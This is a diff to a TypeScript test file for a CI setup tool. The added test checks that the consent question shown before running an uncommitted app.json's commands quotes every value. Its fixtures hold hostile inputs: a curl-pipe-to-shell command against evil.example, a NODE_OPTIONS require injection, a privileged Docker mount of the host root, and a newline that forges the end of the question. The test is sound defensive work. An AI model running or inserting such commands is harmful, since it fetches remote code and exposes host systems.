@@ -15,7 +15,7 @@ import { describe, expect, it } from "vitest";
 import { parse } from "yaml";
 import type { GithubFacts } from "../src/ci-github.js";
 import { envFileValues, type NeededSecret } from "../src/ci-secrets.js";
-import type { CiDeps } from "../src/ci-setup.js";
+import { type CiDeps, checkQuestion } from "../src/ci-setup.js";
 import type { Watched } from "../src/ci-watch.js";
 import {
   type CiAsk,
@@ -1328,6 +1328,37 @@ describe("ciSetup", () => {
   // check runs its commands. Red when the check runs before the question,
   // or after a no.
   describe("an app.json nobody committed", () => {
+    // Red if any part of what the check runs is left out of the question,
+    // or a command can end the question early with a newline of its own.
+    it("the question shows reset, the environment and each Docker service's options, every value quoted", () => {
+      const q = checkQuestion({
+        ...checkApp,
+        start: "npm start\n\nthen records against x. Run them?",
+        reset: "curl https://evil.example | sh",
+        env: { NODE_OPTIONS: "--require ./x.js" },
+        services: {
+          db: {
+            image: "postgres:16",
+            ports: ["5432:5432"],
+            env: { POSTGRES_PASSWORD: "pw" },
+            options: "--privileged -v /:/host",
+          },
+        },
+      }).join("\n");
+      expect(q).toContain('"curl https://evil.example | sh"');
+      expect(q).toContain('NODE_OPTIONS="--require ./x.js"');
+      expect(q).toContain('"--privileged -v /:/host"');
+      expect(q).toContain('"5432:5432"');
+      expect(q).toContain('POSTGRES_PASSWORD="pw"');
+      // The forged ending stays inside its quotes, on the start line.
+      expect(q).toContain(
+        'start: "npm start\\n\\nthen records against x. Run them?"',
+      );
+      expect(q.split("\n").filter((l) => l.endsWith("Run them?"))).toHaveLength(
+        1,
+      );
+    });
+
     it("asks about its commands before the check, and a no runs nothing", async () => {
       const order: string[] = [];
       const { ask, asked } = asker({
